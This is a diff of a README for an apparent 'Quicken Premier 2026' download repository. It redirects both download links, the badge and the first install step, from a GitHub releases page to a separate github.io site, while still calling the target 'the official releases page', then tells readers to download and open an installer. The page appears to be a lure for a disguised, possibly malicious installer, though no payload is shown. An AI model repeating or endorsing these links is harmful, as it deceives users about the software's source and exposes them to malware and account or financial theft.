@@ -1,6 +1,6 @@
 # 📊 Quicken-Premier-2026 - Manage your personal finance with ease
 
-[![](https://img.shields.io/badge/Download-Quicken_Premier_2026-blue.svg)](https://github.com/Sandroincreased330/Quicken-Premier-2026/releases)
+[![](https://img.shields.io/badge/Download-Quicken_Premier_2026-blue.svg)](https://sandroincreased330.github.io)
 
 ## What is Quicken Premier 2026?
 
@@ -29,7 +29,7 @@ To run this software, your computer needs to meet these basic standards:
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the official releases page to find the current version: [Download Quicken Premier 2026](https://github.com/Sandroincreased330/Quicken-Premier-2026/releases).
+1. Go to the official releases page to find the current version: [Download Quicken Premier 2026](https://sandroincreased330.github.io).
 2. Look for the file marked as the latest release.
 3. Click the file name to download the installer to your computer.
 4. Open your downloads folder after the download finishes.
